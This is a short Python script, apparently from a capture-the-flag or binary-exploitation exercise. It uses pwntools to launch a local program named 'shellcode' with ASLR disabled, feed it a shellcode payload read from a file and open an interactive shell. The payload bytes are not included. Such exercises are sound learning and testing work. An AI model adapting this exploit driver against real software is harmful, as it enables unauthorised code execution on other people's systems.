from pwn import *
f = open('eip.in.shellcode')
input = f.read()
pro = process('./shellcode',aslr=False)
#gdb.attach(pro,'b *0x80488CD')
pro.send(input)
pro.interactive()